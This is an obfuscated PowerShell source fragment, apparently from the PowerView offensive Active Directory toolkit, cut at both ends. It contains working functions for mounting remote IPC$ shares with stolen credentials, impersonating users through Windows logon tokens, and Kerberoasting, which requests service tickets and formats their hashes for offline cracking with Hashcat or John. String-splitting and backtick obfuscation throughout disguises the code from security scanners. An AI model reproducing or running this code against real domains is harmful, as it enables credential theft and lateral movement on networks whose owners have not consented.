            ForEach (${uA`Cva`lue} in ${uA`cV`ALUes}.("{2}{1}{0}"-f'merator','u','GetEn').Invoke()) {
                if ( (${va`lUe} -band ${uaC`VA`LuE}."v`AlUE") -eq ${U`Acv`Alue}."VAL`Ue") {
                    ${RESUL`T`UAcVAL`UeS}.("{1}{0}" -f'd','Ad').Invoke(${U`ACV`ALuE}."N`AMe", "$($UACValue.Value)")
                }
            }
        }
        ${r`Esu`lT`UACVALu`es}
    }
}


function GeT-princ`ipa`lcO`N`Te`xT {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{1}{3}{2}{0}" -f 'rocess','ho','dP','ul','PSS'}, '')]
    [CmdletBinding()]
    Param(
        [Parameter(PoSitION = 0, MANDaTORY = ${tr`UE})]
        [Alias({"{0}{1}" -f'Gr','oupName'}, {"{0}{1}{2}"-f'Gro','upIdent','ity'})]
        [String]
        ${IDen`T`ITY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DoMA`iN},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CrED`EN`TiaL} =   ( &("{3}{0}{2}{1}"-f'-VAri','e','AbL','gET') ("{1}{0}"-f 'XO6','Jh3') -vaLUEON)::"EmP`Ty"
    )

    &("{0}{2}{1}"-f 'Ad','-Type','d') -AssemblyName ("{5}{9}{7}{4}{6}{10}{3}{1}{0}{8}{2}" -f 'Manag','count','nt','vices.Ac','ctory','System','Se','ire','eme','.D','r')

    try {
        if (${PSBOU`NDpa`Ra`meTe`RS}[("{0}{1}" -f 'Doma','in')] -or (${idE`NTIty} -match ((("{0}{1}" -f '.+{0}{0}','.+')) -f  [chaR]92))) {
            if (${Ide`Nt`ity} -match ((("{2}{0}{1}" -f'.','+','.+tWStWS')) -ReplaCe  ([ChAR]116+[ChAR]87+[ChAR]83),[ChAR]92)) {
                
                ${CoN`VerTedI`deN`TITy} = ${IdEN`T`ItY} | &("{2}{0}{1}{3}" -f'r','t-A','Conve','DName') -OutputType ("{2}{0}{1}"-f 'nonic','al','Ca')
                if (${C`ONVERTEdIdEnT`i`Ty}) {
                    ${CO`NNe`CT`TaRgeT} = ${cONVERTEDi`De`Nti`Ty}.("{0}{2}{1}" -f'SubS','ng','tri').Invoke(0, ${ConV`eRt`E`diD`eNtIty}.("{1}{0}{2}"-f 'x','Inde','Of').Invoke('/'))
                    ${OBJ`E`CTIDE`NTITY} = ${I`dEnTi`TY}.("{1}{0}"-f 'plit','S').Invoke('\')[1]
                    &("{2}{1}{0}" -f'ose','rite-Verb','W') ('[Ge'+'t-'+'Princ'+'ipalC'+'ontex'+'t'+']'+' '+'Bi'+'ndin'+'g '+'t'+'o '+'do'+'ma'+'in '+"'$ConnectTarget'")
                }
            }
            else {
                ${O`BjEc`Ti`deNTItY} = ${iDe`NTI`Ty}
                &("{2}{3}{1}{0}{4}" -f 'V','te-','W','ri','erbose') ('['+'Get'+'-Princ'+'ipalCont'+'ext]'+' '+'Bind'+'ing'+' '+'t'+'o '+'dom'+'ai'+'n '+"'$Domain'")
                ${cO`NnecTt`ARg`Et} = ${dO`M`AIn}
            }

            if (${pS`B`OundPARAMET`ERS}[("{2}{1}{0}"-f'edential','r','C')]) {
                &("{1}{0}{2}" -f'Verb','Write-','ose') ("{10}{0}{1}{9}{11}{2}{3}{4}{12}{7}{14}{8}{6}{5}{13}" -f'-Prin','cip','t] U','si','ng','tia',' creden','lt','ate','alCont','[Get','ex',' a','ls','ern')
                ${c`onT`ext} = &("{1}{0}{3}{2}" -f'w','Ne','Object','-') -TypeName ("{4}{17}{9}{1}{11}{2}{3}{0}{8}{10}{7}{6}{5}{15}{16}{13}{12}{14}"-f'es','toryS','v','ic','S','an','M','t','.A','m.Direc','ccoun','er','ipalConte','nt.Princ','xt','a','geme','yste') -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::"D`Omain", ${CON`Ne`CttA`RgET}, ${cR`EDe`N`TIal}."U`sEr`NaMe", ${C`Re`deNTi`Al}.("{2}{0}{4}{1}{3}"-f 'tworkCre','t','GetNe','ial','den').Invoke()."pA`Ssw`oRd")
            }
            else {
                ${cO`N`TexT} = &("{1}{2}{0}"-f't','New-O','bjec') -TypeName ("{7}{10}{4}{8}{2}{0}{3}{9}{1}{6}{5}{11}" -f'untMan','men','vices.Acco','ag','tory','palC','t.Princi','System.Dire','Ser','e','c','ontext') -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::"domA`iN", ${c`o`N`NeCT`TARget})
            }
        }
        else {
            if (${Psbo`U`N`dpar`AmEtErs}[("{0}{1}{2}" -f 'Cre','dentia','l')]) {
                &("{2}{0}{3}{1}" -f 'V','rbose','Write-','e') ("{4}{12}{10}{11}{1}{9}{2}{0}{8}{5}{3}{7}{6}" -f'in','Cont',' Us','ernat','[G','alt','dentials','e cre','g ','ext]','-','Principal','et')
                ${DO`ma`inName} = &("{2}{1}{0}"-f '-Domain','t','Ge') | &("{0}{3}{2}{1}"-f 'S','t','bjec','elect-O') -ExpandProperty ("{0}{1}"-f 'N','ame')
                ${c`o`NteXt} = &("{1}{2}{0}"-f't','New','-Objec') -TypeName ("{4}{6}{2}{12}{8}{1}{9}{11}{10}{5}{3}{0}{7}"-f 'ntex','AccountM','i','PrincipalCo','Syst','ment.','em.D','t','s.','ana','e','g','rectoryService') -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::"DOma`iN", ${doMAi`N`Na`me}, ${cr`EdEnt`ial}."usErn`AME", ${c`REDe`NtiAL}.("{2}{3}{1}{0}"-f'l','orkCredentia','GetNet','w').Invoke()."p`ASSWo`Rd")
            }
            else {
                ${cO`Nt`ExT} = &("{1}{0}{2}"-f 'c','New-Obje','t') -TypeName ("{2}{6}{1}{3}{10}{4}{0}{9}{5}{8}{7}" -f 'Management.P','vi','System','c','.Account','i','.DirectorySer','text','palCon','rinc','es') -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::"dOm`Ain")
            }
            ${oBjEct`IdenT`i`TY} = ${iD`ENT`I`Ty}
        }

        ${o`UT} = &("{0}{2}{1}" -f 'N','Object','ew-') ("{0}{1}{2}" -f'PS','Obje','ct')
        ${o`Ut} | &("{2}{1}{0}{3}" -f'Memb','-','Add','er') ("{2}{0}{1}{3}" -f'pro','per','Note','ty') ("{0}{1}"-f'Co','ntext') ${con`T`ext}
        ${O`Ut} | &("{1}{2}{0}"-f 'Member','Ad','d-') ("{1}{0}{2}{3}"-f 'ro','Notep','per','ty') ("{0}{1}{2}" -f 'Ide','n','tity') ${oBJ`ECtidENT`i`Ty}
        ${o`UT}
    }
    catch {
        &("{2}{1}{0}"-f 'e-Warning','it','Wr') ('['+'Get-Pr'+'incip'+'alCon'+'text'+']'+' '+'Error'+' '+'creat'+'i'+'n'+'g '+'bindin'+'g'+' '+'fo'+'r '+'obj'+'ect '+"('$Identity') "+'cont'+'ext'+' '+': '+"$_")
    }
}


function Ad`d-R`eMOT`Ec`oNnEc`TIOn {


    [CmdletBinding(deFaUlTParamEtErsETName = {"{2}{3}{1}{0}"-f 'ame','erN','Compu','t'})]
    Param(
        [Parameter(PoSITIoN = 0, maNDatory = ${Tr`UE}, pARAMETErsEtname = "co`MpUTE`R`NAmE", vaLuEfROmPIpeLInE = ${T`RUE}, valuEfRompIPelInEbYprOPeRTynaME = ${tr`Ue})]
        [Alias({"{0}{1}{2}" -f 'Ho','stNam','e'}, {"{2}{0}{1}"-f'stn','ame','dnsho'}, {"{1}{0}" -f 'me','na'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${C`OMpUt`e`RnA`me},

        [Parameter(pOSitIon = 0, paRamETersETnamE = "pA`Th", mAndaTOry = ${tR`Ue})]
        [ValidatePattern({(("{5}{3}{4}{0}{1}{2}"-f'0','}{0}.*{0}{','0}.*','0','}{0}{','{'))-f[chAr]92})]
        [String[]]
        ${pa`TH},

        [Parameter(MAndaTOry = ${tR`UE})]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CR`EDe`NtiAl}
    )

    BEGIN {
        ${N`e`TREsOUrce`I`NStAN`ce} =   ( &("{1}{0}{3}{2}" -f't-V','GE','AbLE','ari')  ('7U'+'5n') -VaLueO)::("{2}{1}{3}{4}{0}" -f 'nce','r','C','eat','eInsta').Invoke(${n`e`TRESOuR`cew})
        ${nEtreSou`R`ceiNs`TAn`Ce}."dw`Ty`pE" = 1
    }

    PROCESS {
        ${p`AThs} = @()
        if (${pSb`O`UnDPaRam`ETE`RS}[("{2}{1}{0}{3}" -f 't','u','Comp','erName')]) {
            ForEach (${TAR`GETCompute`RNA`Me} in ${C`OMP`UT`ER`NAMe}) {
                ${TA`R`G`EtcOMPUtERNa`me} = ${tAR`GeT`CoMp`U`TErN`AMe}.("{1}{0}" -f 'rim','T').Invoke('\')
                ${PAT`hs} += ,"\\$TargetComputerName\IPC$"
            }
        }
        else {
            ${p`AThS} += ,${pA`Th}
        }

        ForEach (${T`A`Rg`eTpAtH} in ${P`ATHS}) {
            ${NETres`OU`RceiNs`TA`NCe}."lPR`emOTE`Na`Me" = ${t`AR`g`etPath}
            &("{3}{1}{0}{2}{4}"-f 'Verb','te-','os','Wri','e') ('[Ad'+'d'+'-Remote'+'Conne'+'c'+'tion] '+'Atte'+'mpt'+'i'+'ng '+'t'+'o '+'mount:'+' '+"$TargetPath")

            
            
            ${REs`UlT} = ${m`Pr}::("{4}{3}{2}{0}{1}" -f'nnection2','W','ddCo','NetA','W').Invoke(${Ne`TR`e`So`URcEi`NsTAN`CE}, ${CR`edE`N`TiAl}.("{1}{0}{4}{3}{2}"-f 't','GetNe','ntial','e','workCred').Invoke()."Pas`sw`ord", ${Cr`eD`ENtiaL}."uSe`RN`AMe", 4)

            if (${Re`sU`lT} -eq 0) {
                &("{4}{0}{3}{1}{2}" -f 'ite-V','bos','e','er','Wr') ("$TargetPath "+'succes'+'sfu'+'l'+'ly '+'mounte'+'d')
            }
            else {
                Throw "[Add-RemoteConnection] error mounting $TargetPath : $(([ComponentModel.Win32Exception]$Result).Message) "
            }
        }
    }
}


function Re`MOvE-r`e`MOT`ecONnectiOn {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{2}{6}{4}{1}{5}{3}" -f 'PSUseSh','ess','o','ingFunctions','roc','ForStateChang','uldP'}, '')]
    [CmdletBinding(dEFauLTParAmEtERseTnAme = {"{0}{1}{3}{2}" -f'Comput','e','ame','rN'})]
    Param(
        [Parameter(POSiTIoN = 0, MandaTory = ${tr`Ue}, ParAMeteRsETnaMe = "COM`putE`Rna`ME", VaLuefromPiPelINE = ${T`RUe}, ValUEfrOmPIPElINEbYPrOPertYnaMe = ${t`RUE})]
        [Alias({"{1}{2}{0}"-f'Name','H','ost'}, {"{2}{0}{1}" -f'hostnam','e','dns'}, {"{0}{1}"-f 'nam','e'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${comp`U`TErnaME},

        [Parameter(posITIOn = 0, pARaMeteRSetnamE = "pA`TH", ManDAToRY = ${t`RuE})]
        [ValidatePattern({(("{4}{0}{3}{1}{2}" -f '}{0','0}{0','}.*{0}{0}.*','}{','{0')) -F[chaR]92})]
        [String[]]
        ${P`ATH}
    )

    PROCESS {
        ${P`At`hS} = @()
        if (${PSb`O`UN`dpa`RaMeters}[("{1}{2}{3}{0}"-f'e','C','omputer','Nam')]) {
            ForEach (${T`Ar`GETC`o`mpUTe`RnaME} in ${CO`M`P`UTErn`Ame}) {
                ${TA`R`gEtcOMpUt`e`Rn`AmE} = ${TAr`g`ETc`o`MPuternaME}.("{1}{0}" -f 'rim','T').Invoke('\')
                ${P`ATHs} += ,"\\$TargetComputerName\IPC$"
            }
        }
        else {
            ${PAT`hS} += ,${Pa`Th}
        }

        ForEach (${T`AR`GeTp`Ath} in ${pat`hs}) {
            &("{4}{3}{2}{1}{0}" -f'se','bo','er','rite-V','W') ('[Remove-R'+'emot'+'eConn'+'ec'+'tion'+'] '+'Att'+'empti'+'ng'+' '+'to'+' '+'unmou'+'nt'+': '+"$TargetPath")
            ${r`ESULT} = ${m`pr}::("{1}{4}{3}{2}{5}{0}" -f'ion2','W','Co','ncel','NetCa','nnect').Invoke(${TarG`eT`paTh}, 0, ${t`RUe})

            if (${R`Esult} -eq 0) {
                &("{1}{4}{0}{3}{2}"-f 'b','Wri','se','o','te-Ver') ("$TargetPath "+'s'+'u'+'ccessfully '+'ummount'+'ed')
            }
            else {
                Throw "[Remove-RemoteConnection] error unmounting $TargetPath : $(([ComponentModel.Win32Exception]$Result).Message) "
            }
        }
    }
}


function iN`VO`Ke-USeRim`PErSonA`T`IOn {


    [OutputType([IntPtr])]
    [CmdletBinding(dEfaulTpARAMETErsEtname = {"{1}{0}{2}"-f 'r','C','edential'})]
    Param(
        [Parameter(mANDatORY = ${T`RUe}, parAmetErSeTnamE = "CreDEN`T`IaL")]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cREd`e`N`Tial},

        [Parameter(MANdaTory = ${T`Rue}, paRAmeTeRsEtNaMe = "to`K`ENHaNDLe")]
        [ValidateNotNull()]
        [IntPtr]
        ${to`KE`NhANDLE},

        [Switch]
        ${q`UI`eT}
    )

    if (( ${dv9`TO}::"cu`RreNT`T`hreAd".("{4}{2}{1}{3}{0}" -f'tate','m','t','entS','GetApar').Invoke() -ne 'STA') -and (-not ${pSboUN`dP`A`RaMEt`ers}[("{0}{1}"-f'Q','uiet')])) {
        &("{0}{1}{2}{3}" -f 'W','rit','e-Warn','ing') ("{1}{5}{4}{8}{14}{7}{10}{12}{2}{13}{0}{11}{18}{15}{17}{3}{20}{6}{9}{19}{16}" -f'ng','[Inv',' not','rsonation ma','ation] ','oke-UserImperson',' ','l.ex','pow','not','e ','le-th','is',' currently in a si','ershel','rtment state, token i','work.','mpe','readed apa',' ','y')
    }

    if (${PSb`o`UnDp`ARamEtErs}[("{0}{2}{1}"-f 'To','nHandle','ke')]) {
        ${L`ogOntokE`N`h`ANdLE} = ${T`o`KeNhanDle}
    }
    else {
        ${l`ogON`TOk`en`H`AnDle} =  ${9`RzQ}::"zE`RO"
        ${NEtw`o`RKCrED`enT`iAl} = ${c`RE`d`enTiaL}.("{2}{0}{5}{4}{3}{1}"-f'two','l','GetNe','a','denti','rkCre').Invoke()
        ${Us`e`Rdo`MAiN} = ${NEt`Wor`Kc`R`edEn`TiaL}."Do`MaIN"
        ${USERNA`Me} = ${NEtWor`kC`ReDENt`iAL}."UsErN`Ame"
        &("{2}{3}{4}{1}{0}" -f'g','in','W','rite-Wa','rn') "[Invoke-UserImpersonation] Executing LogonUser() with user: $($UserDomain)\$($UserName) "

        
        
        ${rEs`ULT} = ${ad`V`A`PI32}::("{1}{0}"-f 'r','LogonUse').Invoke(${user`N`AMe}, ${u`S`erDO`MAIn}, ${netw`oRkcRe`De`N`TIaL}."PAs`sWo`RD", 9, 3, [ref]${lOGoNT`ok`En`HAndLe});${LasT`eRR`oR} =  ${T`lb}::("{4}{3}{1}{0}{2}"-f '32Err','tLastWin','or','e','G').Invoke();

        if (-not ${RE`su`lt}) {
            throw "[Invoke-UserImpersonation] LogonUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
        }
    }

    
    ${Re`SUlT} = ${advaP`I`32}::("{3}{0}{1}{2}{5}{4}"-f 'sonateLo','gg','ed','Imper','nUser','O').Invoke(${lOGOntOke`NH`AN`dLe})

    if (-not ${Re`Su`lt}) {
        throw "[Invoke-UserImpersonation] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
    }

    &("{0}{3}{1}{2}"-f 'Wri','e-Ver','bose','t') ("{15}{14}{5}{18}{3}{10}{17}{8}{19}{16}{9}{7}{6}{20}{13}{1}{12}{4}{11}{0}{2}" -f 'nat','m','ed','ersonatio','er','e-','successfully','als ','te ','i','n]','so','p','i','k','[Invo','nt',' Alterna','UserImp','crede',' ')
    ${LogOnTOK`eNH`An`dLe}
}


function I`NvO`Ke-REVErTt`OSe`Lf {


    [CmdletBinding()]
    Param(
        [ValidateNotNull()]
        [IntPtr]
        ${tokEN`HA`NDlE}
    )

    if (${P`S`BOUnDpARameTe`RS}[("{3}{1}{2}{0}"-f'ndle','oken','Ha','T')]) {
        &("{1}{2}{0}" -f'ng','Write-War','ni') (("{10}{7}{19}{14}{22}{2}{21}{5}{6}{11}{1}{15}{9}{0}{13}{4}{18}{20}{12}{16}{17}{8}{3}" -f 't','o','g to',' handle','n and cl','e','n imp','ert','ken','a','[Invoke-Rev','ers',') ','io','ver','n','t','o','osing LogonUse','ToSelf] Re','r(','k','tin'))
        ${R`ESuLT} = ${keRn`e`l`32}::("{0}{2}{1}"-f'CloseH','dle','an').Invoke(${tOK`eN`hA`NDle})
    }

    ${R`esU`lt} = ${a`Dva`pI32}::("{1}{2}{3}{0}" -f'f','Rever','t','ToSel').Invoke();${l`AsTEr`ROR} =  ( &("{0}{1}"-f'CHIlDiT','Em')  ("{0}{1}{3}{2}"-f'VaRIabL','E','B',':tl')  )."vaL`Ue"::("{0}{3}{2}{1}"-f 'G','stWin32Error','a','etL').Invoke();

    if (-not ${r`E`sUlt}) {
        throw "[Invoke-RevertToSelf] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
    }

    &("{1}{3}{2}{0}{4}" -f'e-','W','it','r','Verbose') ("{12}{8}{7}{11}{14}{1}{4}{10}{6}{5}{9}{2}{0}{13}{3}"-f'ly r','ertToS','ul','rted','elf] Toke','uccess','nation s','R','ke-','f','n imperso','e','[Invo','eve','v')
}


function GE`T`-D`OMA`inSPnTIcK`eT {


    [OutputType({"{3}{2}{1}{0}"-f 'Ticket','N','P','PowerView.S'})]
    [CmdletBinding(DeFaulTPaRAMetERSeTNAme = {"{0}{1}{2}" -f'RawS','P','N'})]
    Param (
        [Parameter(POsITIoN = 0, PaRaMETErseTNAmE = "RAw`spN", mANDatoRy = ${t`RuE}, vaLUefROMpIPELINe = ${T`RUe})]
        [ValidatePattern({"{0}{1}"-f '.','*/.*'})]
        [Alias({"{2}{1}{3}{0}{4}" -f'ncipalNa','ice','Serv','Pri','me'})]
        [String[]]
        ${s`pn},

        [Parameter(positIon = 0, paramEtERSETname = "U`sER", maNdATOrY = ${t`RuE}, vALuefROMpIpeLine = ${TR`Ue})]
        [ValidateScript({ ${_}."PsoB`jECt"."T`YpEnAM`es"[0] -eq ("{1}{2}{0}"-f'User','PowerVie','w.') })]
        [Object[]]
        ${US`er},

        [ValidateSet({"{0}{1}" -f 'J','ohn'}, {"{0}{2}{1}"-f'Hashc','t','a'})]
        [Alias({"{0}{2}{1}"-f'For','t','ma'})]
        [String]
        ${oUtPuT`F`O`R`MAT} = ("{2}{0}{1}" -f'hca','t','Has'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${crE`DE`NTIAl} =   ${J`h3xO6}::"EMP`Ty"
    )

    BEGIN {
        ${Nu`lL} =  ${n`6dT}::("{0}{2}{3}{1}" -f 'L','ame','oadWithPartial','N').Invoke(("{3}{1}{2}{0}" -f 'l','dentityMo','de','System.I'))

        if (${P`sBO`Und`paRAM`ETERS}[("{1}{0}{2}" -f 'ede','Cr','ntial')]) {
            ${L`OgOnTok`EN} = &("{3}{2}{4}{1}{0}" -f 'onation','s','-','Invoke','UserImper') -Credential ${cR`EDeNt`i`AL}
        }
    }

    PROCESS {
        if (${PsBo`Un`DPA`Ra`MeTERS}[("{0}{1}"-f 'U','ser')]) {
            ${t`Ar`gETob`J`eCT} = ${US`eR}
        }
        else {
            ${TA`R`G`eTOBj`ecT} = ${S`PN}
        }

        ForEach (${ob`je`CT} in ${tarGeT`oB`ject}) {
            if (${P`SBoUNDpArAmEt`E`RS}[("{1}{0}" -f'er','Us')]) {
                ${USE`RS`PN} = ${o`BjecT}."s`erVIC`ePRinC`i`paLn`Ame"
                ${s`A`MACcoun`TnA`ME} = ${oBj`e`Ct}."s`A`Ma`C`COuntnAME"
                ${d`iStiNG`U`iSh`eDnAme} = ${ob`jECt}."DIsTiNG`UIs`hE`D`Name"
            }
            else {
                ${US`er`spN} = ${oB`Je`ct}
                ${SAma`C`COU`NtnaME} = ("{1}{0}" -f'KNOWN','UN')
                ${DIST`ing`Uishe`DNA`Me} = ("{1}{0}{2}"-f'N','U','KNOWN')
            }

            
            if (${USeR`Spn} -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                ${uS`eRs`pN} = ${Us`E`Rspn}[0]
            }

            try {
                ${TI`cK`ET} = &("{0}{2}{1}"-f 'N','bject','ew-O') ("{3}{9}{13}{0}{12}{8}{4}{5}{11}{14}{6}{7}{10}{1}{2}" -f'ent','yTo','ken','System.','T','o','rosRequest','or','tyModel.','I','Securit','kens.Kerb','i','d','e') -ArgumentList ${u`sE`RSpN}
            }
            catch {
                &("{2}{4}{1}{3}{0}"-f'ning','-','Wr','War','ite') ('[Get-D'+'oma'+'i'+'nSPNTick'+'et] '+'Error'+' '+'requ'+'estin'+'g '+'ti'+'c'+'ket '+'for'+' '+'SPN'+' '+"'$UserSPN' "+'fro'+'m '+'us'+'er '+"'$DistinguishedName' "+': '+"$_")
            }
            if (${tiC`K`et}) {
                ${TIcK`ETBY`TEsTr`e`Am} = ${t`I`cKEt}.("{1}{0}{2}"-f'tReq','Ge','uest').Invoke()
            }
            if (${tiCkEt`B`yTES`TREam}) {
                ${o`UT} = &("{2}{0}{3}{1}"-f 'b','t','New-O','jec') ("{1}{0}{2}"-f'j','PSOb','ect')

                ${tICke`T`hExS`T`ReaM} =  (&("{0}{1}"-f'IT','eM') ('vA'+'rI'+'ABlE:zV5'+'2')  )."v`ALUe"::("{1}{0}{2}"-f'Strin','To','g').Invoke(${TIck`ETbyt`E`Stream}) -replace '-'

                ${o`Ut} | &("{2}{1}{0}" -f'ember','M','Add-') ("{0}{1}{2}"-f'Note','proper','ty') ("{2}{0}{1}{4}{3}" -f 'am','Ac','S','Name','count') ${sAMaCc`Ou`N`TnAMe}
                ${o`UT} | &("{2}{1}{0}" -f'-Member','dd','A') ("{1}{0}{2}"-f 'ep','Not','roperty') ("{3}{2}{1}{0}"-f 'me','a','nguishedN','Disti') ${dIStIng`UI`SHe`dNAME}
                ${O`UT} | &("{1}{2}{0}"-f'ber','Add-Me','m') ("{3}{2}{1}{0}" -f 'ty','oper','otepr','N') ("{1}{2}{0}{3}" -f 'lNa','Servic','ePrincipa','me') ${tIC`kET}."Se`Rvi`CEP`R`in`CipAlnaME"

                
                
                if(${ti`Ck`et`heXSt`ReaM} -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
                    ${E`TYpe} =  (  &("{1}{2}{0}{3}"-f 'arIAB','Get-','v','le')  ("{0}{1}" -f'I','TA7l'))."Va`luE"::("{0}{2}{1}"-f'To','yte','B').Invoke( ${mA`TChEs}."ET`y`PElEN", 16 )
                    ${ci`pH`ERtExtl`eN} =  (  &("{2}{0}{1}" -f'IaB','le','VaR') ("{0}{1}" -f 'itA','7l')  )."V`ALUe"::("{2}{1}{0}"-f '2','oUInt3','T').Invoke(${M`ATcHeS}."CIPhEr`Te`x`TLEn", 16)-4
                    ${ciphE`RtE`xt} = ${M`A`TCHes}."DATaT`Oe`ND".("{1}{0}{2}"-f 'bs','Su','tring').Invoke(0,${CiP`he`Rt`exT`LeN}*2)

                    
                    if(${mA`T`ChEs}."D`AtatoE`Nd".("{2}{0}{1}" -f'i','ng','Substr').Invoke(${c`ipHErTE`X`TlEN}*2, 4) -ne ("{1}{0}" -f'2','A48')) {
                        &("{1}{3}{0}{2}"-f'e-W','Wr','arning','it') "Error parsing ciphertext for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq "
                        ${h`ASh} = ${n`ULl}
                        ${o`UT} | &("{2}{0}{1}" -f '-Mem','ber','Add') ("{0}{1}{2}" -f'No','tepr','operty') ("{2}{4}{0}{5}{3}{1}" -f 'cketBy','m','T','exStrea','i','teH') (  (&("{1}{0}"-f'ci','G') ('vAr'+'iA'+'ble:'+'d9ef') )."va`lUE"::("{0}{1}" -f 'ToSt','ring').Invoke(${TIcKETbYt`EsTR`e`AM}).("{0}{1}" -f 'Repl','ace').Invoke('-',''))
                    } else {
                        ${HA`Sh} = "$($CipherText.Substring(0,32))`$$($CipherText.Substring(32))"
                        ${o`UT} | &("{1}{0}{2}" -f 'dd','A','-Member') ("{1}{0}{2}" -f 'prop','Note','erty') ("{3}{1}{2}{5}{0}{4}" -f'xStr','B','yt','Ticket','eam','eHe') ${NU`LL}
                    }
                } else {
                    &("{4}{2}{0}{1}{3}"-f'ni','n','rite-War','g','W') "Unable to parse ticket structure for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq "
                    ${Ha`Sh} = ${n`Ull}
                    ${O`UT} | &("{1}{0}{2}" -f 'd','A','d-Member') ("{1}{0}{2}" -f'oper','Notepr','ty') ("{3}{5}{2}{1}{4}{0}"-f'eam','H','te','T','exStr','icketBy') ( (&("{0}{1}{2}"-f'Ge','T','-ITem')  ("{2}{0}{1}"-f'iaB','lE:d9ef','vAr') )."va`lue"::("{2}{0}{1}" -f'oStr','ing','T').Invoke(${t`ICketbYt`Es`T`Re`AM}).("{1}{0}{2}"-f'ac','Repl','e').Invoke('-',''))
                }

                if(${ha`Sh}) {
                    
                    if (${o`U`TpUtfOrMat} -match ("{1}{0}"-f 'hn','Jo')) {
                        ${haSHF`orm`At} = "`$krb5tgs`$$($Ticket.ServicePrincipalName):$Hash"
                    }
                    else {
                        if (${diSTiN`G`UI`SHedn`A`me} -ne ("{0}{1}{2}" -f'UNK','NOW','N')) {
                            ${Us`ErD`O`maIN} = ${Di`s`TINGu`iShEdnAme}.("{2}{0}{1}"-f'ubStrin','g','S').Invoke(${DisTi`NGu`is`hedN`AmE}.("{0}{2}{1}" -f'I','f','ndexO').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                        else {
                            ${usE`R`DomAiN} = ("{0}{1}" -f'U','NKNOWN')
                        }

                        
                        ${HA`sHFO`Rmat} = "`$krb5tgs`$$($Etype)`$*$SamAccountName`$$UserDomain`$$($Ticket.ServicePrincipalName)*`$$Hash"
                    }
                    ${o`UT} | &("{2}{0}{1}"-f'dd','-Member','A') ("{1}{3}{0}{2}"-f 'pr','Not','operty','e') ("{1}{0}" -f'sh','Ha') ${Hash`FO`R`MaT}
                }

                ${O`UT}."PS`o`BJECT"."TYPena`MeS".("{1}{0}" -f 't','Inser').Invoke(0, ("{3}{2}{1}{0}" -f 'Ticket','w.SPN','ie','PowerV'))
                ${o`UT}
            }
        }
    }

    END {
        if (${logoNt`O`k`eN}) {
            &("{0}{2}{1}{4}{3}"-f 'Invoke-R','vert','e','Self','To') -TokenHandle ${lOg`ontOK`eN}
        }
    }
}


function iNVOk`e-k`ERBEROa`st {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{2}{1}{3}"-f 'P','houl','SS','dProcess'}, '')]
    [OutputType({"{4}{3}{0}{1}{2}" -f 'iew.SPNTick','e','t','werV','Po'})]
    [CmdletBinding()]
    Param(
        [Parameter(POsiTion = 0, vaLUEFrOmPipelINe = ${tr`Ue}, VAluefrompiPELINebypROpertyNAme = ${TR`UE})]
        [Alias({"{3}{4}{1}{0}{5}{2}"-f 'edN','ish','me','Di','stingu','a'}, {"{3}{2}{1}{0}"-f'Name','unt','Acco','Sam'}, {"{0}{1}"-f 'Na','me'}, {"{7}{0}{4}{1}{2}{3}{5}{6}" -f'emb','s','ting','uis','erDi','hedN','ame','M'}, {"{1}{3}{0}{2}"-f'am','Membe','e','rN'})]
        [String[]]
        ${Id`Ent`ity},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dO`m`Ain},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f'F','ilter'})]
        [String]
        ${l`daPfIL`TeR},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}"-f 'A','ath','DSP'})]
        [String]
        ${SE`ARc`Hbase},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{4}{0}{3}" -f'ntroll','i','Doma','er','nCo'})]
        [String]
        ${sEr`V`ER},

        [ValidateSet({"{1}{0}" -f'e','Bas'}, {"{1}{0}{2}" -f 'e','On','Level'}, {"{0}{2}{1}"-f'Sub','ee','tr'})]
        [String]
        ${s`eAR`C`hSCoPE} = ("{0}{1}"-f'Subtre','e'),

        [ValidateRange(1, 10000)]
        [Int]
        ${reS`ULtPAgES`i`ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sE`RVerti`me`L`imiT},

        [Switch]
        ${TO`MB`sTO`NE},

        [ValidateSet({"{1}{0}" -f 'hn','Jo'}, {"{0}{1}" -f'Ha','shcat'})]
        [Alias({"{1}{0}" -f 'rmat','Fo'})]
        [String]
        ${OUTPu`T`FOR`MaT} = ("{2}{1}{0}"-f'at','ashc','H'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${crE`Den`TIAl} =  ${j`h3x`o6}::"emP`Ty"
    )

    BEGIN {
        ${useRSeaRch`eRa`RgUm`e`NTs} = @{
            'SPN' = ${T`RuE}
            ("{2}{0}{1}" -f 'opertie','s','Pr') = ("{0}{6}{3}{7}{4}{2}{5}{8}{1}" -f's','me','edname,ser','m','guish','viceprincipaln','a','accountname,distin','a')
        }
